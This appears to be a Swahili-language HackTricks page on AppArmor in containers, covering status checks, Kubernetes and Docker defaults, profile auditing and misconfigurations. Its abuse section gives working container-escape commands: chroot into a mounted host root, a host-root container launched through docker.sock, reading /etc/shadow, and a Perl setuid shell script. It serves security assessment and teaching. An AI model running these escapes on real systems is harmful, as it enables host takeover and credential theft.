# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

AppArmor ni mfumo wa **Mandatory Access Control** unaoweka vizuizi kupitia profaili za kila programu. Tofauti na ukaguzi wa kawaida wa DAC, unaotegemea sana umiliki wa mtumiaji na kikundi, AppArmor huruhusu kernel kutekeleza sera inayohusishwa moja kwa moja na mchakato. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na ruhusa za kawaida zinazotosha kujaribu kitendo fulani, lakini bado ikazuiwa kwa kuwa profaili yake ya AppArmor hairuhusu njia husika, mount, tabia ya mtandao au matumizi ya uwezo.

Jambo muhimu zaidi la kuelewa ni kwamba AppArmor hutegemea njia (path-based). Huchanganua ufikiaji wa mfumo wa faili kwa kutumia sheria za njia, badala ya lebo kama SELinux. Hilo hurahisisha matumizi yake na kuifanya iwe na nguvu, lakini pia humaanisha kwamba bind mounts na mpangilio mbadala wa njia vinahitaji kuzingatiwa kwa makini. Ikiwa maudhui yale yale ya host yanaweza kufikiwa kupitia njia tofauti, sera inaweza kuwa na matokeo tofauti na yale ambayo mwendeshaji alitarajia mwanzoni.

## Nafasi Yake Katika Kutenga Container

Ukaguzi wa usalama wa container mara nyingi huishia kwenye capabilities na seccomp, lakini AppArmor huendelea kuwa muhimu hata baada ya ukaguzi huo. Fikiria container yenye ruhusa nyingi kuliko inavyopaswa kuwa nazo, au workload iliyohitaji capability moja ya ziada kwa sababu za kiutendaji. AppArmor bado inaweza kuzuia ufikiaji wa faili, tabia ya mount, mitandao na mifumo ya utekelezaji kwa njia zinazozuia matumizi mabaya yaliyo wazi. Ndiyo maana kuzima AppArmor “ili tu programu ifanye kazi” kunaweza kubadilisha kimyakimya usanidi ulio hatarishi tu kuwa unaoweza kutumiwa vibaya moja kwa moja.

## Maabara

Ili kuangalia kama AppArmor inatumika kwenye host, tumia:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Ili kuona mchakato wa sasa wa container unaendeshwa chini ya nini:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Tofauti hii inafundisha. Katika hali ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor unaohusishwa na profile iliyochaguliwa na runtime. Katika hali isiyozuiwa, safu hiyo ya ziada ya vizuizi hutoweka.

Unaweza pia kukagua kile ambacho Docker inadhani imetumia:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Matumizi ya Runtime

Docker inaweza kutumia profile ya AppArmor ya kawaida au maalum ikiwa host inaiunga mkono. Podman pia inaweza kuunganishwa na AppArmor kwenye mifumo inayotumia AppArmor, ingawa kwenye distributions zinazotanguliza SELinux, mfumo huo mwingine wa MAC mara nyingi huwa ndio unaotumika zaidi. Kubernetes inaweza kuwezesha sera za AppArmor katika kiwango cha workload kwenye nodes zinazoiunga mkono. LXC na mazingira mengine yanayohusiana ya system-container katika familia ya Ubuntu pia hutumia AppArmor kwa kiwango kikubwa.

Jambo la msingi ni kwamba AppArmor si "kipengele cha Docker". Ni kipengele cha kernel ya host ambacho runtimes kadhaa zinaweza kuchagua kutumia. Ikiwa host haiiungi mkono au runtime imeelekezwa kuendesha bila vizuizi, ulinzi unaodhaniwa haupo kweli.

Kwa Kubernetes hasa, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, AppArmor annotations za zamani za beta zimeacha kupendekezwa. Kwenye hosts zinazotumika, `RuntimeDefault` ndiyo profile ya kawaida, huku `Localhost` ikielekeza kwenye profile ambayo lazima iwe tayari imepakiwa kwenye node. Hili ni muhimu wakati wa ukaguzi kwa sababu manifest inaweza kuonekana kuwa inatumia AppArmor, ilhali bado inategemea kabisa usaidizi wa upande wa node na profiles zilizopakiwa awali.<sup>[[1]](#references)</sup>

Jambo moja dogo lakini muhimu kiutendaji ni kwamba kuweka wazi `appArmorProfile.type: RuntimeDefault` kuna masharti makali zaidi kuliko kuacha sehemu hiyo bila kuwekwa. Ikiwa sehemu hiyo imewekwa wazi na node haiungi mkono AppArmor, admission inapaswa kushindwa. Ikiwa sehemu hiyo haijawekwa, workload bado inaweza kuendeshwa kwenye node isiyo na AppArmor bila kupata safu hiyo ya ziada ya vizuizi. Kwa mtazamo wa mshambuliaji, hii ni sababu nzuri ya kukagua manifest na hali halisi ya node.<sup>[[1]](#references)</sup>

Kwenye hosts za AppArmor zinazotumia Docker, profile ya kawaida inayojulikana zaidi ni `docker-default`. Profile hiyo hutengenezwa kutoka kwenye template ya AppArmor ya Moby, na ni muhimu kwa sababu inaeleza kwa nini baadhi ya PoCs zinazotegemea capabilities bado hushindwa ndani ya container ya kawaida. Kwa ujumla, `docker-default` huruhusu matumizi ya kawaida ya mtandao, huzuia uandishi katika sehemu kubwa ya `/proc`, huzuia ufikiaji wa sehemu nyeti za `/sys`, huzuia mount operations, na huzuia ptrace ili isitumike kama njia ya jumla ya kuchunguza host. Kuelewa kiwango hicho cha msingi husaidia kutofautisha kati ya "container ina `CAP_SYS_ADMIN`" na "container inaweza kweli kutumia capability hiyo dhidi ya interfaces za kernel ninazozijali".

## Usimamizi wa Profiles

Profiles za AppArmor kwa kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Kanuni ya kawaida ya kutaja majina ni kubadilisha slashes kwenye njia ya executable kuwa nukta. Kwa mfano, profile ya `/usr/bin/man` kwa kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Jambo hili ni muhimu katika ulinzi na tathmini kwa sababu ukishajua jina la profile inayotumika, mara nyingi unaweza kuipata faili inayolingana haraka kwenye host.

Amri muhimu za usimamizi kwenye host ni pamoja na:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Sababu inayofanya amri hizi ziwe muhimu katika mwongozo wa usalama wa kontena ni kwamba zinaeleza jinsi profaili zinavyoundwa, kupakiwa, kubadilishwa kuwa complain mode, na kurekebishwa baada ya mabadiliko ya programu. Ikiwa opereta ana mazoea ya kubadilisha profaili ziwe complain mode wakati wa kutatua matatizo na kusahau kurejesha enforcement, kontena linaweza kuonekana kuwa limelindwa kwenye nyaraka huku kiuhalisia likiwa na vizuizi vichache zaidi.

### Kuunda Na Kusasisha Profaili

`aa-genprof` inaweza kufuatilia tabia ya programu na kusaidia kuunda profaili kwa maingiliano:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` inaweza kutengeneza wasifu wa kiolezo ambao unaweza kupakiwa baadaye kwa kutumia `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Wakati binary inabadilika na sera inahitaji kusasishwa, `aa-logprof` inaweza kucheza tena vizuizi vilivyopatikana kwenye logs na kumsaidia mwendeshaji kuamua kuviruhusu au kuvizuia:

```bash
sudo aa-logprof
```

### Kumbukumbu

Kukatazwa kwa AppArmor mara nyingi huonekana kupitia `auditd`, syslog, au zana kama `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Hili ni muhimu katika shughuli za kiutendaji na kwa mashambulizi. Watetezi hutumia hili kuboresha profiles. Washambuliaji hutumia hili kujua njia au operesheni mahususi inayozuiwa na kama AppArmor ndiyo udhibiti unaozuia msururu wa exploit.

### Kutambua Faili Mahususi ya Profile

Runtime inapoonyesha jina mahususi la AppArmor profile kwa container, mara nyingi ni muhimu kuoanisha jina hilo na faili ya profile iliyo kwenye diski:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Hili ni muhimu hasa wakati wa ukaguzi upande wa host kwa sababu linaunganisha pengo kati ya "container inasema inaendeshwa chini ya profile `lowpriv`" na "sheria halisi ziko kwenye faili hii mahususi inayoweza kukaguliwa au kupakiwa upya".

### Sheria Muhimu Za Kukagua

Unapoweza kusoma profile, usiishie kwenye mistari rahisi ya `deny`. Aina kadhaa za sheria hubadilisha kwa kiasi kikubwa jinsi AppArmor itakavyokuwa na manufaa dhidi ya jaribio la kutoroka kwenye container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: tekeleza binary lengwa bila vizuizi. Ikiwa helper, shell, au interpreter inayoweza kufikiwa inaruhusiwa chini ya `ux`, kwa kawaida hilo ndilo jambo la kwanza la kujaribu.
- `px` / `Px` na `cx` / `Cx`: badilisha profile wakati wa exec. Hizi si mbaya moja kwa moja, lakini zinafaa kukaguliwa kwa sababu mabadiliko yanaweza kupeleka kwenye profile pana zaidi kuliko ya sasa.
- `change_profile`: huruhusu task kubadili na kuingia kwenye profile nyingine iliyopakiwa, mara moja au wakati wa exec inayofuata. Ikiwa profile lengwa ina vizuizi vichache zaidi, hili linaweza kuwa njia iliyokusudiwa ya kutoroka kutoka kwenye domain yenye vizuizi vikali.
- `flags=(complain)`, `flags=(unconfined)`, au `flags=(prompt)` mpya zaidi: hizi zinapaswa kubadilisha kiwango cha uaminifu unachoiweka kwenye profile. `complain` huandika denials kwenye log badala ya kuzitekeleza, `unconfined` huondoa mpaka wa usalama, na `prompt` hutegemea njia ya uamuzi ya userspace badala ya deny inayotekelezwa na kernel pekee.
- `userns` au `userns create,`: sera mpya zaidi za AppArmor zinaweza kudhibiti uundaji wa user namespace. Ikiwa profile ya container inaruhusu hili waziwazi, user namespace zilizoundwa ndani yake bado zinawezekana hata pale ambapo platform hutumia AppArmor kama sehemu ya mkakati wake wa kuimarisha usalama.

Grep muhimu upande wa host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ukaguzi wa aina hii mara nyingi huwa na manufaa zaidi kuliko kuchunguza mamia ya sheria za kawaida za faili. Ikiwa breakout inategemea kutekeleza helper, kuingia kwenye namespace mpya, au kutorokea profile yenye vizuizi vichache zaidi, jibu mara nyingi huwa limefichwa katika sheria hizi zinazohusu transitions badala ya mistari inayoonekana wazi kama `deny /etc/shadow r`.

## Mipangilio Isiyo Sahihi

Kosa lililo wazi zaidi ni `apparmor=unconfined`. Wasimamizi mara nyingi huiweka wakati wa kutatua hitilafu ya programu iliyosababishwa na profile kuzuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa flag hii itabaki kwenye production, safu nzima ya MAC huwa imeondolewa kwa vitendo.

Tatizo jingine lisilo dhahiri sana ni kudhani kwamba bind mounts hazina madhara kwa sababu ruhusa za faili zinaonekana za kawaida. Kwa kuwa AppArmor hutegemea njia, kufichua njia za host chini ya maeneo mbadala ya mount kunaweza kuingiliana vibaya na sheria za njia. Kosa la tatu ni kusahau kwamba jina la profile katika faili ya config halina maana kubwa ikiwa kernel ya host hailazimishi AppArmor kutekelezwa.

## Matumizi Mabaya

AppArmor isipokuwepo, shughuli zilizokuwa zimewekewa vizuizi zinaweza kuanza kufanya kazi: kusoma njia nyeti kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kuwa ngumu zaidi kutumia, kutekeleza shughuli zinazohusiana na mount ikiwa capabilities/seccomp pia zinaruhusu, au kutumia njia ambazo profile kwa kawaida ingekataa. AppArmor mara nyingi ndiyo hufafanua kwa nini jaribio la breakout linalotegemea capability "linapaswa kufanya kazi" kinadharia lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio hilohilo linaweza kuanza kufanikiwa.

Ikiwa unashuku kuwa AppArmor ndiyo kizuizi kikuu cha mnyororo wa matumizi mabaya unaotegemea path-traversal, bind-mount, au mount, hatua ya kwanza kwa kawaida ni kulinganisha kinachoweza kufikiwa ukiwa na profile na bila profile. Kwa mfano, ikiwa njia ya host imewekwa ndani ya container, anza kwa kuangalia kama unaweza kuipitia na kuisoma:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio ya vitendo zaidi ni kubaini kama AppArmor ndiyo udhibiti unaozuia shughuli za mount au ufikiaji wa filesystems nyeti za kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Katika mazingira ambamo njia ya host tayari inapatikana kupitia bind mount, kupoteza AppArmor kunaweza pia kubadilisha tatizo la ufichuaji wa taarifa za kusoma pekee kuwa ufikiaji wa moja kwa moja wa faili za host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Lengo la amri hizi si kwamba AppArmor pekee ndiyo husababisha breakout. Ni kwamba AppArmor ikiondolewa, njia nyingi za kutumia vibaya filesystem na mount zinaweza kujaribiwa mara moja.

### Mfano Kamili: AppArmor Imezimwa + Root ya Host Imewekwa Mount

Ikiwa root ya host tayari imewekwa bind-mount kwenye `/host`, kuondoa AppArmor kunaweza kubadilisha njia ya kutumia vibaya filesystem iliyozuiwa na kuwa njia kamili ya kutoroka kutoka kwa host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Mara tu shell inapotekelezwa kupitia mfumo wa faili wa host, workload kwa vitendo imeutoroka mpaka wa container:

```bash
id
hostname
cat /etc/shadow | head
```

### Mfano Kamili: AppArmor Imezimwa + Runtime Socket

Ikiwa kizuizi halisi kilikuwa AppArmor inayolinda hali ya runtime, socket iliyomountiwa inaweza kutosha kufanya escape kamili:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Njia halisi hutegemea sehemu ya kupachika, lakini matokeo ni yale yale: AppArmor haizuii tena ufikiaji wa runtime API, na runtime API inaweza kuzindua container inayoweza kuhatarisha host.

### Mfano Kamili: Uepukaji wa Bind-Mount Unaotegemea Njia

Kwa kuwa AppArmor hutegemea njia, kulinda `/proc/**` hakulindi kiotomatiki maudhui yale yale ya procfs ya host yanapofikiwa kupitia njia tofauti:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Athari hutegemea kile hasa kilichowekwa kwenye mount na iwapo njia mbadala pia inakwepa vidhibiti vingine, lakini muundo huu ni mojawapo ya sababu zilizo wazi zaidi zinazoonyesha kwamba AppArmor lazima ichunguzwe pamoja na mpangilio wa mount, badala ya kuchunguzwa peke yake.

### Mfano Kamili: Shebang Bypass

AppArmor inaweza kuhusisha profile na njia ya script inayotekelezwa badala ya interpreter iliyotajwa kwenye shebang yake. Kinyume chake, kumwita interpreter moja kwa moja kunaweza kuchagua profile ya interpreter hiyo. [Msimamizi wa AppArmor anaeleza tofauti hii](https://bugs.launchpad.net/apparmor/+bug/1911431). Mfano wa kihistoria ulihusu script ambayo mstari wake wa kwanza unaelekeza kwenye interpreter yenye vikwazo:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Mfano huu ni hali inayoweza kuruhusu uwezo wa faili wa interpreter kuanza kutumika na attachment halisi ya exec ya script kuruhusu operesheni hiyo. Kagua policy iliyopakiwa na lebo ya mchakato, capability bounding set, `no_new_privs`, na hali ya `nosuid` ya mount; jina la faili la profile au orodha ya `cap_setuid+ep` pekee hazithibitishi kuwa kuna transition inayoweza kutumika. Mnyororo wa interpreter na njia mbadala za utekelezaji zinahitaji ukaguzi tofauti.

## Checks

Lengo la ukaguzi huu ni kujibu haraka maswali matatu: je, AppArmor imewezeshwa kwenye host, je, mchakato wa sasa umewekewa confinement, na je, runtime ilitumia profile kwa container hii?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Kinachovutia hapa:

- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload haipati ulinzi wa AppArmor.
- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile kwenye runtime config ni la mwonekano tu.
- Ikiwa `docker inspect` inaonyesha `unconfined` au profile maalum usiyoitarajia, mara nyingi hiyo ndiyo sababu njia ya matumizi mabaya inayotegemea filesystem au mount inafanya kazi.
- Ikiwa `/sys/kernel/security/apparmor/profiles` haina profile uliyotarajia, config ya runtime au orchestrator pekee haitoshi.
- Ikiwa profile inayodaiwa kuwa ngumu ina sheria za aina ya `ux`, `change_profile` pana, `userns`, au `flags=(complain)`, mpaka halisi wa usalama unaweza kuwa dhaifu zaidi kuliko jina la profile linavyodokeza.

Ikiwa container tayari ina privileges za juu kwa sababu za kiutendaji, kuacha AppArmor ikiwa imewashwa mara nyingi ndiko kunakotofautisha isipokuwa linalodhibitiwa na hitilafu pana zaidi ya usalama.

## Mipangilio Chaguomsingi ya Runtime

| Runtime / platform | Hali chaguomsingi | Tabia chaguomsingi | Kudhoofisha kwa mikono kunakotokea mara nyingi |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguomsingi kwenye host zinazotumia AppArmor | Hutumia AppArmor profile ya `docker-default` isipobadilishwa | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Hutegemea host | AppArmor inatumika kupitia `--security-opt`, lakini chaguomsingi halisi hutegemea host/runtime na si ya jumla kama profile ya `docker-default` iliyoandikwa kwenye nyaraka za Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Chaguomsingi hutegemea hali | Ikiwa `appArmorProfile.type` haijabainishwa, chaguomsingi ni `RuntimeDefault`, lakini hutumika tu AppArmor ikiwa imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` yenye profile dhaifu, node zisizotumia AppArmor |
| containerd / CRI-O chini ya Kubernetes | Hufuata usaidizi wa node/runtime | Runtime zinazoungwa mkono na Kubernetes kwa kawaida hutumia AppArmor, lakini utekelezaji halisi bado hutegemea usaidizi wa node na mipangilio ya workload | Kama ilivyo kwenye safu ya Kubernetes; config ya moja kwa moja ya runtime pia inaweza kuruka AppArmor kabisa |

Kwa AppArmor, kigezo muhimu zaidi mara nyingi ni **host**, si runtime pekee. Mipangilio ya profile kwenye manifest haiundi ulinzi kwenye node ambayo AppArmor haijawezeshwa.

## References

- [1] [Muktadha wa usalama wa Kubernetes: sehemu za AppArmor profile na tabia ya usaidizi wa node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ukurasa wa `apparmor.d(5)` wa Ubuntu 24.04: mabadiliko ya exec, `change_profile`, `userns`, na bendera za profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
